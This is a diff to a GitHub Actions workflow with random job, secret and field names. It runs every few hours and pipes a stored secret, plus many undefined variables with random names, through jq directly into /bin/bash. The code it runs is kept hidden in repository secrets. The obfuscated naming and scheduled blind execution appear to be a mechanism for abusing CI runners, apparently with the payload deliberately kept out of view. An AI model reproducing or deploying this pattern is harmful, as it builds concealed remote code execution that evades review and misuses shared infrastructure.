@@ -1,9 +1,9 @@
 name: taohuani4163
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
-
+    - cron: '42 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: taohuani4163
         env:
-          gd62: ${{ secrets.gd62 }}
+          xdsb09: ${{ secrets.xdsb09 }}
         run: |
-          echo $gd62 | jq -r .pmkgb07 | /bin/bash
-          echo $tcp8 | jq -r .o4 | /bin/bash
-          echo $svzn42689 | jq -r .q764 | /bin/bash
-          echo $dt86936 | jq -r .rolpv550 | /bin/bash
-          echo $b3710 | jq -r .bxsf32 | /bin/bash
-          echo $cp912 | jq -r .pql18 | /bin/bash
-          echo $kkgxt45413 | jq -r .ag4700 | /bin/bash
-          echo $s4 | jq -r .twipu05 | /bin/bash
-          echo $wecgo6292 | jq -r .siqu6 | /bin/bash
-          echo $eds6762 | jq -r .yq9 | /bin/bash
-          echo $j50 | jq -r .dkxet508 | /bin/bash
+          echo $xdsb09 | jq -r .py59095 | /bin/bash
+          echo $zvuka59118 | jq -r .idww8 | /bin/bash
+          echo $govs75898 | jq -r .wjni77607 | /bin/bash
+          echo $ythr47283 | jq -r .vpor43 | /bin/bash
+          echo $qjyy61 | jq -r .uivmg8852 | /bin/bash
+          echo $z7 | jq -r .y7 | /bin/bash
+          echo $mlxe52 | jq -r .quo4123 | /bin/bash
+          echo $c51300 | jq -r .mnmgt25 | /bin/bash
+          echo $zyzi872 | jq -r .t7653 | /bin/bash
+          echo $jla41736 | jq -r .ynrg30884 | /bin/bash
+          echo $hr1 | jq -r .lks13313 | /bin/bash
+          echo $marjh934 | jq -r .rovfv09 | /bin/bash
+          echo $hnx8024 | jq -r .sduai763 | /bin/bash
 
